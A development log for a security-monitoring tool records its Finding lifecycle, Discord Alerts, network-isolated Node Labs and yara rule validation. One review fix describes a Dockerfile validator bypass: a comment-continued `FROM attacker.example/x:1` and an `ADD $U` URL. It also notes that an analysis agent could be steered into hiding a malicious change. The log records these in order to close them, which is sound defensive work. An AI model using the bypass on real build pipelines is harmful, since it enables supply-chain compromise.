## Phase 3: Findings and Alerts (2026-11-13)

Phase 3 (A11, A12), T1–T5. This section records each task, the acceptance mapping and the phase's verification.

What each task changed:
- **T1, sources, lifecycle and Operator actions (A11).**
  - Migration `a08b9cb4d3e8` renames Finding `kind` to `source` (`0day` to `commit`, `cve` kept) and maps status `fixed` to `remediated` (`open` kept). It gives every row `data.cause: {by: numen}` and a `data.source_ref` (the commit's short SHA, else the CVE id), and leaves artifacts and other data untouched. Its downgrade is refused, naming the Finding ids, while any Finding is Confirmed or Dismissed or has a `served_content` or `advisory` source.
  - `domain.transition_finding` is the only lifecycle move (`FINDING_TRANSITIONS`, `FINDING_CAUSES`). It locks the row, raises for a cause that cannot set that state, returns false from any other state, and records a `transition` action with the cause and its time.
  - `POST /findings/{id}/transitions` (`{state, reason}`, CSRF-protected, 409 `invalid_transition`) gives the Operator Confirm, Dismiss and Mark remediated. `PATCH /findings/{id}` no longer takes `status` and refuses a source change with `immutable_source`.
  - Responses add `source`, `source_ref`, `cause` and `deployed_version` (`unknown`). A verified Lab run confirms its Finding with `{by: proof, lab_run_id}`. Draft stays `artifact_state` only.
- **T2, opening and linking (A11).**
  - `domain.open_finding` opens one Finding for each affected Application (`domain.affected_applications`: link on and not removed, Application not archived), or returns the existing one unchanged in any state. A repeat Analysis therefore never duplicates a Finding and never reopens a Dismissed one.
  - A Malicious change Verdict now opens a Finding. Its drafts stay with the Analysis.
  - `domain.link_change` maps the Analysis `addresses` to the Application's Open or Confirmed Findings only. It records a `linked` action and leaves the Finding's state and cause unchanged.
  - `domain.analysis_reaches` lets the other Applications' Findings reference a shared Upstream Analysis. Commit records list `findings` across Applications with `relation: source|linked`.
- **T3, Alerts (A12).**
  - `domain.notify` stores only `{application, account, source, verdict, link}`. The delivery is `{content, allowed_mentions: {parse: []}}` with no embeds.
  - `open_finding` queues `finding:{id}:opened`, and the first `analysis_cap_reached` row of a scope and UTC day queues `cap:{scope}:{id}:{day}`.
  - Numen's security-candidate (Triage), candidate-mark and eligible-CVE triggers and the `notified_hash` write are removed. The outbox, retry, AC-16 behaviour and the test button are kept.
  - The journey's Discord step now checks one fixed-template test delivery and no Alert for a candidate mark.
- **T4, UI.**
  - The register shows each Finding's source and State with its cause. The Finding page has a Lifecycle panel with Confirm, Dismiss and Mark remediated and a required reason, a History panel (opened, linked and transition events), and a separate Deployed version row (Unknown).
  - The commit pages link each Verdict to its Findings as `{State} finding · {Application}` (`Linked:` for a linked one). The commit review button that sets `confirmed` reads Confirm revision. Badge tones cover `remediated` and `dismissed`.
- **T5, this sweep.**
  - The contract now gives `POST /findings` (an Open Finding with cause `operator`, no Alert) and the `PATCH` refusals in the routes list. It defines the dashboard's `open_findings` and `security_reviews` counts, and its verified adjustments record the Phase 3 deviations below.
  - README step 5 links Verdicts to Findings and explains Confirm revision. Step 7 covers the history, the Deployed version, Draft, mentions and hand-made Findings.
  - Settings no longer uses the glossary's avoided term "notification": the button reads Send test Alert, the empty history No Alert deliveries, and an unnamed row `Alert n`. The Findings register heading is Finding register, where it said "Confirmed evidence" but also lists Open Findings.
  - Two tests are renamed: `test_webhook_failure_retry_retains_its_identity` (was `…_retains_candidate_identity`) and `test_confirmed_commits_link_their_findings_without_an_alert` (was `…_without_a_candidate_notification`). The second now asserts that no Alert is queued at all, where it only checked for candidate ones, so it covers the hand-made Finding deviation below.

Acceptance tests, all passing in the runs below:

| Criterion | Tests |
|---|---|
| AC-A11: a linked fix shows both changes in the Finding's history and leaves the state unchanged | backend `test_a_linked_fix_shows_both_changes_in_the_history_and_leaves_the_state_unchanged`, `test_links_map_addresses_only_within_each_application`, `test_postgres_findings_open_and_link_within_each_application` (the same scenario on PostgreSQL); UI `Findings` "shows the lifecycle, the history of linked changes and the Deployed version separately", `CommitReview` "links a Verdict to the Findings it opened and was linked to" |
| AC-A11: a Dismissed Finding is not reopened by the same Verdict on a repeat Analysis | `test_a_repeat_analysis_opens_no_duplicate_and_never_reopens_a_dismissed_finding` (the same and a different opening Verdict), `test_each_opened_finding_sends_one_alert_per_application` (a repeat sends no second Alert) |
| AC-A11: a Remediated Finding records what remediated it | `test_a_remediated_finding_records_what_remediated_it` (Remediation PR, version bump, Baseline match, Deployed version), `test_operator_confirms_dismisses_and_remediates_with_a_reason`; UI `Findings` "confirms, dismisses and marks a finding remediated with a reason" |
| A11 opening: Own and Upstream Verdicts, one Finding per affected Application, Malicious change, served content and advisory | `test_an_own_repository_verdict_opens_a_finding` (all three opening Verdicts), `test_a_shared_upstream_verdict_opens_a_finding_in_every_application_that_uses_it`, `test_malicious_change_opens_a_finding_and_keeps_its_drafts_with_the_analysis`, `test_open_finding_takes_served_content_and_advisory_sources`, `test_a_second_applications_finding_accepts_the_shared_analysis` |
| A11 lifecycle: the transitions, their causes, Draft, the Operator actions | `test_internal_confirmations_apply_only_to_open_findings` (Proof, Detection rule, Advisory match), `test_operator_confirms_dismisses_and_remediates_with_a_reason` (reason trimmed and bounded, 409 `invalid_transition`, CSRF), `test_draft_is_an_artifact_state_not_a_lifecycle_state`, `test_bundle_draft_completion_immutable_revision_and_lab_failure` (a verified Lab run confirms with `{by: proof}`); UI `Findings` "lists each finding with its source, lifecycle state and cause", "preserves structured version evidence and leaves the lifecycle alone when editing" |
| A11 migration: `open` to Open, `fixed` to Remediated, `0day` to commit, `cve` kept, data and artifacts kept | `test_postgres_migration_moves_findings_to_sources_and_the_lifecycle` (upgrade, refused downgrade, exact restore) |
| AC-A12: a commit message containing `@everyone` and a link appears in no Alert | `test_an_alert_carries_only_application_generated_fields` (commit message, author, agent title and summary all carry `@everyone`, `@here` and a link; the one delivery is the fixed template with `allowed_mentions: {parse: []}`) |
| AC-A12: Security hardening, Unrelated and Review queue entries send no Alert | `test_nothing_else_sends_an_alert` (also a Triage security candidate, single and batch candidate marks, an eligible CVE), `test_marking_candidates_sends_no_alert`, `test_confirmed_commits_link_their_findings_without_an_alert` (a hand-made Finding); journey Discord step |
| AC-A12: not-exposed Verdicts send no Alert | Phase 7: Exposure is not computed yet, so every Upstream link counts as exposed. Phase 7 adds the filter in `domain.affected_applications` and this test |
| AC-A12: delivery failure behaves as in Numen's AC-16 | `test_a_failed_alert_retries_with_its_identity_and_changes_no_finding`, `test_webhook_failure_retry_retains_its_identity` |
| A12: Alerts when a Finding opens and when a cap is reached, fixed template, legacy rows | `test_each_opened_finding_sends_one_alert_per_application`, `test_a_cve_analysis_that_opens_a_finding_alerts_as_advisory`, `test_a_reached_cap_sends_one_alert_per_cap_per_day` (Application and account caps, once per day, again the next UTC day), `test_a_legacy_numen_notification_is_sent_without_its_text`; journey Discord step (`allowed_mentions`, no embeds) |
| Plan Done-when: a commit message containing `@everyone` produces an Alert without it | `test_an_alert_carries_only_application_generated_fields` |

Deviations from the plan, PRD and ADRs:
- **Hand-made Findings.** A Finding the Operator creates by hand (`POST /findings`) sends no Alert. Only Findings the application opens do.
- **CVE-analysis Findings.** A `cve`-source Finding (CVE analysis carried over from Numen) alerts as "Advisory" with the CVE id as its source.
- **Account-cap Alerts.** An account-cap Alert carries the Provider account's label instead of an Application name, because an account cap belongs to no Application.
- **Legacy outbox rows.** A legacy Numen row, if retried, sends only `Asset Monitor: Alert` and its link, never its stored title or detail.
- **Exposure.** Exposure is computed in Phase 7. Until then every Upstream link counts as unknown, which counts as exposed, so an opening Verdict opens a Finding in every Application that uses the repository.
- **Shared Analyses.** A shared Analysis row keeps the first Application's `application_id`. Findings in the other Applications reference it through `domain.analysis_reaches`, which relaxes Numen's same-Application rule for commit Analyses only. The drafted bundle is published once per affected Application, so storage grows with the number of Applications.
- **De-duplication.** There is no database uniqueness on (Application, source, subject), because carried-over data holds duplicate manual Findings. The opening de-duplication is application code with `SELECT … FOR UPDATE`, so two concurrent Analyses of one commit can still race to a duplicate, as in Numen.
- **Repeat Verdicts.** A repeat Analysis that returns a different opening Verdict reuses the Application's existing Finding for that commit and never reopens it. An Analysis of a commit that no in-use Application's repository holds opens no Finding.
- **Linking by prefix.** Linking matches a short SHA (7 or more hex characters) as a prefix within one Application, so a very short, ambiguous prefix could link the wrong Finding of that Application. A change linked once is never opened later, even after the Finding is Remediated.
- **Callers still to come.** A verified Lab run now confirms its Finding (cause `proof`); Phase 4 puts Labs behind Approval and must keep that call. The `deployed_version` caller (Phase 7) must restrict itself to Own-repository Vulnerability fix Findings, because `transition_finding` does not check the Verdict or the role.
- **Review decisions and counts.** Numen's commit review decisions (`candidate`, `confirmed`, `dismissed`) stay separate from the Finding lifecycle, and the commit button that sets `confirmed` reads Confirm revision. The Open findings counts on the dashboard and the Application page count only `open`, not Confirmed.
- **Downgrade.** The migration downgrade is refused while any Finding is Confirmed or Dismissed or has a `served_content` or `advisory` source, because Numen cannot represent them. This follows the existing refusal pattern.
- **Linking in any state.** The phase brief maps `addresses` to Open or Confirmed Findings; the review fixes below link to the Application's Findings in any state, as A11's "an existing Finding" reads, so a fix addressing a Dismissed or Remediated Finding opens nothing new.

**Review fixes.** After the T1–T5 review:
- Only a Vulnerability fix is kept from opening by its `addresses`. A Vulnerability introduced or Malicious change always opens its own Finding and Alert and is also linked to the Findings it names, so an agent steered into listing an older SHA or CVE cannot hide it (`test_an_introducing_change_opens_its_own_finding_whatever_it_addresses`).
- `domain.link_change` matches the Application's Findings in any state (the updated `test_links_map_addresses_only_within_each_application`: Blog's Dismissed X is linked, no new Finding and no Alert).
- A drafted `vulnerable_ref` that fails validation no longer fails the job before opening: the Findings open and alert, no bundle is published, the job succeeds and the error is kept as `bundle_error` on the Analysis (`test_an_unrelated_vulnerable_revision_opens_the_finding_without_publishing_its_bundle`). This replaces Phase 2's "Invalid vulnerable revision" behaviour.
- A repeat commit or CVE Analysis leaves a Dismissed or Remediated Finding's evidence, `source_analysis_id` and bundle as they were, and a commit Analysis no longer resets `target_applicability` (`test_a_repeat_analysis_opens_no_duplicate_and_never_reopens_a_dismissed_finding`). CVE analysis still refreshes an Open or Confirmed Finding's applicability from its computed facts, as in Numen.
- `domain.notify` inserts under a savepoint and ignores the unique `event_key` conflict, so two workers reaching one cap at once no longer fail the second Triage transaction (`test_a_cap_alert_lost_to_a_concurrent_worker_keeps_the_transaction`).
- `PATCH /findings/{id}` recomputes a commit Finding's `source_ref` from its `source_commit_id` (`test_editing_a_commit_findings_source_commit_updates_its_source_ref`).

**Stale-reference sweep.** `git grep -n -i "0day\|kind.*cve\|status.*fixed\|Security candidate:\|candidate and eligible CVE\|embeds\|notified_hash\|opens no Finding"` over `backend`, `frontend`, `tests` and `docs/implementation-contract.md`, with migrations excluded, finds no stale text. The remaining hits are deliberate:
- `kind.*cve` hits on job kinds (`cve_analysis`, `cve_sync`) in `domain.py`, `worker.py` and backend and UI tests; `source_kind` with `cve_selectors` in `test_repositories.py`; and the CVE/commit analysis prop of `AnalysisResult.tsx`. None is a Finding kind;
- the migration test's legacy `0day` and `fixed` rows and its mapping (`test_postgres.py`);
- `test_a_legacy_numen_notification_is_sent_without_its_text`, which seeds a legacy `Security candidate: @everyone` row to show that its text is never sent;
- the journey's assertion that `embeds` is absent from the delivery;
- in the contract: lines where an unrelated `status` or `kind` precedes "fixed" or "cve" (Jev's `change_kind`, the Transcript `kind: triage`, CVE `match_status`, `fixed_versions`, "the current fixed checkout", "prefixed `Linked:`"), the record of migration `a08b9cb4d3e8` (`0day` to `commit`, `fixed` to `remediated`), and "with no embeds" in the Alert delivery.

The broader sweep for this phase's terms (`operator status`, `candidate notification`, "notification" in UI text) left only `/notifications` API paths, the `Notification` model and `notification` job kind, the internal `notify` helpers, and the CVE test "opens existing CVE notification links", which covers links in Numen's stored CVE rows. `docs/design/numen-design.md` and `docs/ui-spec/numen-ui-spec.md` still describe Numen's operator status and its Test notification button, because they document Numen.

**Outside traffic.** No paid inference was made, and no request reached a real Asset, GitHub, Discord, a package registry or `herdr.dev`. Alert delivery is tested against a monkeypatched `httpx.post` in the backend suites and against the integration fixture server's webhook in the journey. Model providers are `FixtureBroker` or loopback fixtures. Numen's pre-existing gateway runtime test still opens one credential-free TCP tunnel to `api.openai.com:443` to prove that a provider host is allowed. It sends no TLS handshake and no request.

## Phase 4: Labs behind Approval (2026-11-13)

Phase 4 (A07 Labs, the Approval bullets of A15), T1–T5. This section records each task, the acceptance mapping and the phase's verification.

What each task changed:
- **T1, Approval (A15).**
  - `POST /findings/{id}/lab-runs` takes `{password}` (`ApprovalInput`, `repr=False`). One reusable check, `approval(request, db, password)` in `create_app`, runs before the completeness check and the enqueue, and Phase 6 will call it too. It first calls `throttle(request, scope, code, message)`, login's old inline limit moved out and keyed by `(scope, client address)`: 10 attempts per 60 s, then 429 `approval_rate_limited`. It then verifies the password against the Operator's hash. A missing, empty or wrong password gets 403 `approval_refused`, also straight after a good Approval: there is no cache and no window. CSRF is the router's existing `auth` dependency.
  - A new Lab run records an Action `{action: approved, approved: lab_run, job_id, artifact_revision}` on the Finding; an idempotent repeat records no second one. The password reaches no job input, Action, event or log.
  - `POST /jobs/{id}/retry` refuses a `lab_run` with 409 `approval_required`, and the block that copied a Lab run for a retried Lab job is deleted.
  - UI: the Lab panel's button reads Start Lab and opens a password dialog (`type=password`, `autoComplete=current-password`); a refusal keeps it open with the message. The history shows Approved · Lab, Jobs hides Retry for `lab_run`, and the Lab job summary reads Reproduced or Not reproduced.
- **T2, offline build and the ADR-0005 limits (A07).**
  - `asset-monitor-lab:0.1.0` carries pinned Node 24.9.0 and npm. `FROM` may name only it, `scratch` or an earlier stage, `COPY --from` only an earlier stage, and a URL `ADD`/`COPY` source is refused. The digest-base pull, the `lab_base_fetch` event and the retained base cache are deleted. `artifacts.completeness` mirrors these rules, and lock `images` must be exactly `asset-monitor-lab:0.1.0`.
  - `build_lab` builds with `network_mode="none"`. A `LABEL` with the run's labels follows every `FROM`, so every layer and build-step container carries the run label, and cleanup lists images with `all=True` and removes leaves first.
  - A watchdog kills the run's build-step containers at `build_seconds` (also through a silent `RUN`); an image over `image_bytes` fails with `lab_image_too_large`. `LAB_MAXIMA` is 600 s run, 900 s build and 4 GiB; the run deadline starts after the build. The backend's Lab defaults follow, and it waits up to 1800 s for a Lab.
  - The application runs on the internal `numen-job-<run>` network only, alias `application`; the Lab's egress bridge is gone.
- **T3, phase one and Node only (A07).**
  - A bundle without `vulnerable-app/package.json` fails with `lab_stack_unsupported` before any Engine call.
  - `fetch_dependencies` runs a fixed `npm ci`/`npm install --ignore-scripts --no-audit --no-fund` in the Lab base, nonroot and bounded, on an internal `asset-monitor-lab-fetch-<run>` network whose gateway allows only the `NUMEN_NPM_REGISTRY_URL` host. Its environment has no credential, and `RunRequest` refuses a `lab` request that carries one. `node_modules` joins the build context, bounded by `image_bytes`.
  - The Lab base's global npmrc sets `ignore-scripts=true`, so npm in a bundle's `RUN` or `CMD` skips dependency scripts too. The `lab_dependencies` runtime event replaces `lab_base_fetch`.
- **T4, Own-repository Proofs, results and the agents' Lab contract (A07).**
  - For a `commit` Finding whose source commit is in a repository its Application links as Own, `Workflows.lab_run` sends that repository at the Verdict's commit, from its stored snapshot, under `vulnerable-app/` with the bundle's files over it (without the snapshot's `manifest.json` and the repository's `.dockerignore`), and records `source_ref` in `LabRun.data`. Upstream and Numen CVE Findings keep the bundle-only Lab.
  - A verified Lab still confirms with `{by: proof, lab_run_id}`; a not-reproduced or failed one makes no lifecycle call.
  - `prompt_templates/sections/bundle.md` describes the offline Node Lab, its base, its limits and the Own-repository case, and commit Analysis gets an `own_repository` fact.
- **T5, journey, docs and this sweep.**
  - The journey's uploaded bundle is a tiny Node app (`package.json`, a dependency-free `package-lock.json`, `server.js`) whose PoC reads a leaked value through `TARGET_URL`. A new step sends a wrong password (403 `approval_refused`), then the bootstrap password (202), waits for the Lab on the real Engine, and asserts a `verified` Lab run, a Confirmed Finding with cause `proof` and the `approved` event. The Lab took about 18 s through `lab_dependencies`, `lab_build`, `lab_built` and `lab_started`.
  - A failed `lab_run` job no longer shows a "retry" remedy: its hint reads "A Lab is not retried: fix the cause, then start a new Lab from its Finding with a new Approval.", and the retry fact is left out (UI `Jobs` "explains a lab_run failed with broker_unavailable", seen failing first).
  - The runtime test `test_completed_lab_stays_nonterminal_until_application_cleanup_is_confirmed` waited 20 s for its Lab to reach `cleanup_pending`. With phase one, the build and the 10 s startup watch in front, that is about what a Lab takes, and the first full `make test-runtime` of this task failed there with the run still `running`. It now waits up to 120 s.
  - `runner/README.md`'s Lab bundles section is now Labs, in the order Node only, phase one, phase two, limits, run. The contract's `lab-runs` route names its 403 and 429 codes, and its verified adjustments record this phase's deviations. README step 7 and the runtime paragraph describe Start Lab with Approval and the offline Node Lab.

Acceptance tests, all passing in the runs below:

| Criterion | Tests |
|---|---|
| AC-A15: an Approval with a missing or wrong password is refused, even straight after another Approval | backend `test_an_approval_checks_the_password_on_every_request` (a good Approval, then wrong, missing and empty passwords refused with 403, no second job; a forged CSRF token refused; the password in no job, Action, event or log), `test_approvals_are_rate_limited_like_login`, `test_a_lab_job_is_never_retried_without_a_new_approval`; UI `Findings` "starting a Lab asks for the Operator's password", `Jobs` "offers no Retry for a failed Lab: a new Lab needs a new Approval"; journey Approval step (wrong password, then the real Engine) |
| AC-A07: a Lab build cannot run a dependency install script | runtime `test_lab_dependency_install_scripts_never_run` (a vendored `file:` tarball with preinstall, install and postinstall scripts and a `RUN npm rebuild`; seen failing with scripts enabled in phase one and with the npmrc removed); runner `test_lab_fetch_gateway_reaches_only_the_registry`, `test_a_lab_request_carries_no_credential` |
| AC-A07: a Lab run cannot reach any network | runtime `test_lab_has_no_outbound_network` (the app and the PoC: TCP to a live listener on another bridge times out, DNS is blocked); the offline build itself in every runtime Lab test |
| AC-A07: a Lab over a limit fails visibly and leaves no image behind | runtime `test_lab_over_a_limit_fails_and_leaves_no_image[image_bytes]`, `[build_seconds]` (a silent `RUN sleep`), `[timeout_seconds]` (no container, network, volume or image left, and the set of `org.pruferva.asset-monitor.image=true` images unchanged); backend `test_a_lab_over_a_limit_fails_visibly_and_changes_no_state`, `test_lab_runs_default_to_the_adr_0005_limits`; runner `test_lab_limits_are_the_adr_0005_ceilings`, `test_every_stage_of_a_lab_build_carries_the_run_label` (so cleanup removes a failed build's layers) |
| AC-A07: a Lab that fails to reproduce stays visible as not reproduced | runtime `test_own_repository_at_the_fixed_revision_is_not_reproduced`; backend `test_a_lab_that_does_not_reproduce_stays_visible_and_changes_no_state`; UI `Findings` "starting a Lab asks for the Operator's password" (Not reproduced shown) |
| A07: Node is the only Lab stack; the Lab base runs Node | runner `test_a_lab_refuses_a_bundle_that_is_not_node`; runtime `test_lab_base_runs_node` |
| A07: an Own-repository Proof's app is the Own repository at the Verdict's commit; Upstream Proofs stay bundle-only | backend `test_an_approved_lab_builds_the_own_repository_at_the_verdicts_commit`, `test_an_upstream_proof_keeps_the_bundle_only_lab`; runtime `test_own_repository_node_vulnerability_reproduces` |
| A07: bundles name only the bundled base and no URL source; agents are told so | backend `test_completeness_accepts_exactly_the_bases_the_lab_verifier_builds`, `test_completeness_refuses_directives_the_lab_verifier_rejects`, `test_completeness_requires_lock_images_to_be_the_bundled_lab_base`, `test_the_bundle_section_describes_the_offline_node_lab` |
| Plan Done-when: a fixture Own-repository vulnerability reproduces after Approval | three pieces together: backend `test_an_approved_lab_builds_the_own_repository_at_the_verdicts_commit` (Approval, then the Lab input built from the Own snapshot, against `FixtureBroker`), runtime `test_own_repository_node_vulnerability_reproduces` (the same input shape on the real Engine), and the journey Approval step (API, worker, broker and the real Engine on a bundle-only fixture Finding) |
| Plan Done-when: runtime tests show that an install script does not run, the Lab has no network, and an oversized image fails and leaves nothing behind | the runtime rows above |
| Plan Done-when: AC-A15's Approval bullet has a test | the AC-A15 row above |

Deviations from the plan, PRD and ADRs:
- **Lab bases.** Numen's bundle contract allowed digest-pinned bases. Lab bases are now only `asset-monitor-lab:0.1.0` (pinned Node 24.9.0), `scratch` and earlier stages, and URL `ADD`/`COPY` sources are refused, because the Engine would fetch these outside `--network none` and a retained base contradicts ADR-0005's "images removed after every run". A carried-over bundle with a digest base reads as Draft and is refused at Lab start. A Node app that needs another Node version cannot get one in this release.
- **Install scripts.** AC-A07's "cannot run a dependency install script" is enforced for npm: `--ignore-scripts` in phase one and `ignore-scripts=true` in the Lab base's global npmrc, which covers `npm install`, `ci` and `rebuild` in `RUN` or `CMD`. `RUN` stays accepted and runs offline. A bundle that runs a dependency's script directly (`node node_modules/x/install.js`) still runs it, with no network. `composer --no-scripts` is not implemented, because Node is the only first-release stack.
- **Node only, checked late.** `artifacts.completeness` does not check the Node-only rule, so a non-Node bundle reads as complete and is refused with `lab_stack_unsupported` only at Lab start, after its Approval.
- **Image limit.** The 4 GB is checked after the build and covers the whole image, the Lab base layers included. A step that writes more than the host disk holds is stopped only by the 15-minute build deadline; the phase-one dependency volume is bounded only by the disk and that deadline.
- **Registry egress untested against a registry.** No test reaches a registry: runtime fixtures vendor `file:` dependencies and the gateway's allowlist is unit-tested. With a real registry, the gateway's 64 MiB-per-tunnel bound could cut a large install over one keep-alive connection; lockfiles that resolve from other registries or git URLs fail visibly; the registry must be https on port 443.
- **Approval rate limit.** Like login's, it is in memory per app process: it resets on restart and is keyed by client address, so behind the Operator's tunnel every request shares one address. Refused Approvals are rate-limited but not recorded as Actions; only granted ones are.
- **No Lab retry.** Retrying a `lab_run` job is refused; a new Lab needs a new Approval. The worker's crash recovery still re-runs an approved job at least once, which is the approved action, not a new one.
- **Own-repository Labs.** They use the stored snapshot, which omits binary media and is bounded (20,000 files / 64 MiB), and `package.json` must sit at the repository root. Completeness is judged on the bundle alone, so an Own-repository Dockerfile must `COPY . /app/`. Finding generation (regenerating a bundle) gets no `own_repository` fact, so its agent may bundle a minimal app, which still runs because the bundle's files win. A repository that is Own for one Application and Upstream for another gets one drafted bundle published to both Findings, and a Dockerfile-only bundle written for the Own case fails the Upstream Application's bundle-only Lab with `lab_stack_unsupported`. Upstream and Numen CVE Findings keep the bundle-only Lab until Phase 7.
- **Reproduces after Approval.** No single automated test covers the Own-repository overlay and the real Engine together; the Done-when row above names the three pieces that do.
- **Run deadline.** The Lab's 10 minutes now start after the build and include the app's startup, where Numen gave one shared budget, so a slowly booting app may time out. The backend's per-container memory default (6144 MB) is unchanged; runtime tests pass small limits.
- **No migration.** The Approval is an `actions` row and `LabRun.data` (JSON) gains `source_ref`.

**Stale-reference sweep.** `git grep -n -i "verify in lab\|lab_base_fetch\|digest-pinned base\|with network\|internet access\|Executable RUN"` over `backend`, `frontend`, `runner`, `tests`, `README.md` and `docs/implementation-contract.md` leaves three hits, all deliberate:
- `backend/tests/test_prompts.py` (twice): `test_the_bundle_section_describes_the_offline_node_lab` lists these phrases to assert the bundle instructions no longer contain them;
- `docs/implementation-contract.md`'s agent-run paragraph: Codex keeps its shell "in its native `:workspace` sandbox with network off except for `version_recipe`", which is about agent runs, not the Lab.

A broader sweep for "digest", "lab verif" and "retry" in the README, the runner README and the UI found README line 52 (a bundle "must pin every base by digest", built "with the network its dependencies need") and the generic "retry" remedies shown for a failed Lab, both fixed above. The Finding page's "Lab verification" wording and the generic "Retry" remedies for other job kinds are accurate and kept. The history entries above (PHP/mariadb Lab, build daemon) record what was verified at the time and are left as they are.

**Outside traffic.** No paid inference was made, and no request reached a real Asset, GitHub, Discord, a package registry or `herdr.dev`. Phase one's registry is `https://registry.invalid` for runtime tests and in the test stack's broker, the journey's lockfile has no dependencies, and runtime fixtures vendor `file:` tarballs. The no-network test aims only at a private listener on a test bridge and at `host.docker.internal`. Model providers are `FixtureBroker` or loopback fixtures. Numen's pre-existing gateway runtime test still opens one credential-free TCP tunnel to `api.openai.com:443` to prove that a provider host is allowed. It sends no TLS handshake and no request.

Review fixes, made after the first table of runs below and verified by the second:
- **Dockerfile read as the Engine reads it.** Both validators and `labelled()` joined a line ending in `\` before skipping comments, while Docker drops a comment line first. `FROM asset-monitor-lab:0.1.0` / `# note \` / `FROM attacker.example/x:1` passed both checks, the Engine pulled the hidden base, and `labelled()` added no run label after it, so cleanup and the build watchdog missed that stage. `ARG U=https://…` with `ADD $U /x` and a `# escape=` directive got past the URL and continuation rules the same way. `engine.instructions` (runner) and its mirror `artifacts.dockerfile_instructions` (backend; the two packages ship in separate images) now follow Docker 20.10's parser: comment lines are dropped before joining, blank and comment lines inside a continuation are skipped, and continuations join without an added space. Parser directives and `$` in `FROM`, `COPY` and `ADD` are refused. `labelled()` emits exactly those instructions with a `LABEL` after each `FROM`, and cleanup also removes the `asset-monitor-lab-job:<run>` tag by name. Tests: runner `test_lab_accepts_a_real_build_but_never_a_host_path_or_a_floating_base` (comment-continued `FROM`, `ADD $U`, `FROM $B`, `# escape=`), `test_every_stage_of_a_lab_build_carries_the_run_label`; backend `test_completeness_reads_the_dockerfile_shapes_the_verifier_will_see`.
- **A Malicious change never gets a Lab** (ADR-0004 rule 6, AC-A07). A Finding a Malicious change Verdict opened could still be given a complete bundle by upload or generation, and for an Own repository `lab_run` would then build and run the malicious commit. `domain.malicious_change` (opened by that Verdict, or the source commit's newest Verdict is Malicious change) refuses `POST /findings/{id}/lab-runs` with 409 `lab_not_allowed` after the Approval check, and `Workflows.lab_run` checks again before the merge, so a Lab queued before a later Analysis found the commit malicious fails without reaching the broker. Test: backend `test_a_malicious_change_never_gets_a_lab`.
- **Cached artifact state.** A Finding caches its artifact state by revision, and this phase tightened completeness, so a carried-over digest-base bundle still read as complete until its next upload. The cache now also carries `artifacts.RULES` (2), and a state cached under other rules is recomputed on read, so such a bundle reads as Draft as stated above. No migration: the cache lives in `findings.data`.

## Phase 5: Malicious change branch (2026-11-14)

Phase 5 (A07's static Proof, Detection rule validation for commits and the cleanup report; ADR-0004 point 6; the Malicious change row of A06 for Own and Upstream repositories, without Remediation PRs (Phase 6) and the served-content sweep (Phase 9)), T1–T5. This section records each task, the acceptance mapping and the phase's verification.

What each task changed:
- **T1, yara and the `detection_rule` runner kind.**
  - The probe image `asset-monitor-probe:0.1.0` carries yara pinned to Debian bookworm's `yara=4.2.3-4`. The first `make build` confirmed that version, and `yara --version` prints 4.2.3. The Lab, broker, gateway and agent images do not carry it.
  - The new `detection_rule` kind runs in the probe image with `network_mode none`: no gateway, no proxy variables, only `HOME` and `PATH` in its environment, no Docker socket, and the read-only `/workspace/inputs` as its only mount. `RunRequest` refuses a credential for `lab` or `detection_rule` ("a Lab or Detection rule run carries no credential"), accepts archive inputs for this kind, and applies `RULE_MAXIMA` (600 s, 1024 MB, 2 CPUs, 64 pids, 8 MiB output, 256 MiB input), which callers may only lower. Both ceiling lookups go through one `CEILINGS.get(kind, MAXIMA)`.
  - `workload.detection_rule` reads `inputs/rule.yar` and refuses `include` and the `console` module (also through a comment or `\xHH` escapes) before compiling with `yarac --no-warnings`. A rule that does not compile returns `{compiled: false, error}` with the first 500 characters of stderr. Otherwise it scans each of `changed`, `parent` and `baseline` that was sent and returns `{compiled: true, error: null, matches: {tree: {files, count}}}` (relative paths, sorted, at most 1000 listed). Any nonzero exit, any stderr, or a match path outside the scanned tree fails the run with "Detection rule scan failed". Only `yarac` and `yara` run, the job writes no outputs, and the broker cleans up as for any run.
  - `runner/README.md` has a Detection rules section, and the contract's runtime paragraph lists the kind.
- **T2, Analysis outputs, checked indicators, cleanup report and the static Proof as a Draft.**
  - A Malicious change Verdict must return `indicators` (`files`, `hosts`, `urls`, `commands`) and `reachable_secrets`, plus `detection-rule.yar`; the schema requires both fields for that Verdict only and has no hash field. The new prompt section `sections/detection-rule.md` replaces the old request for `cleanup-report.md`, and `prompts.DESCRIPTIONS` lists it.
  - New module `backend/numen/detection.py`: `changed_files` (added or changed paths, removals skipped, an SVN path matched by its longest suffix on a directory boundary), `check_indicators` (keeps changed files with their sha256 from the snapshot and hosts, URLs and commands that occur in an added diff line; everything else goes to `rejected` with its reason), `containing_commits` (the commit, then later stored commits on the same branch by `committed_at`, at most 100, plus the Baseline for a Backfill commit; marked `ponytail:` for Phase 7's tag containment), `STATIC_REQUIRED`, `rule_text` and `static_state`.
  - `Workflows.commit_analysis` checks the indicators against the snapshot it already loaded, computes the containing commits and reads the releases from `Sources.github_tags` (None for WordPress and on any error), then sets `static_proof` and `cleanup_report` on each Open or Confirmed Finding and publishes a revision of `report.md`, `indicators.json` and, when drafted, `detection-rule.yar` with `require_complete=False`. The "until Phase 5" comment is deleted.
  - `domain.set_finding_artifacts` fills `static_proof` in on every new revision (Analysis or upload); a missing, empty, over-64-KiB or non-UTF-8 rule gives a failed `rule` check. `finding_artifact_state` reads `detection.static_state` first, so `artifacts.RULES` needed no bump. `finding_json` adds `malicious_change`.
- **T3, the validation job, Confirmed on success and Draft with the failed check otherwise.**
  - Each pending static Proof revision queues a `detection_rule` job (input `{finding_id, artifact_revision}`, idempotency key `detection-rule:{finding id}:{revision}`), stored as `static_proof.job_id`; this covers commit Analysis, a repeat Analysis and an uploaded `detection-rule.yar`. A revision whose rule already failed the `rule` check queues nothing.
  - `Workflows.detection_rule` reads the revision's `detection-rule.yar` (integrity-checked) and builds the trees through `self.snapshot()`, the stored snapshot or else the existing read-only GitHub tarball or SVN export: the commit's changed files, the parent (`parent_revisions[0]`, else `commit_parents()`, SVN rev-1, or empty for a root commit) and `baseline_revision`, which is skipped for a Backfill commit, when it is the parent, or when there is none. It runs the kind with no profile and no limits, holds the fence, and, if the revision is still current, calls `transition_finding(..., "confirmed", {by: detection_rule, artifact_revision, job_id})` on a pass before writing `status`, `checks` and `job_id`. A superseded revision's result stays on its job (`current: false`).
  - `detection.TREES` and `detection.checks` give the checks `rule`, `changed`, `parent` and `baseline`, each tree check with `files` and `count`; a malformed result raises `invalid_rule_result` (422).
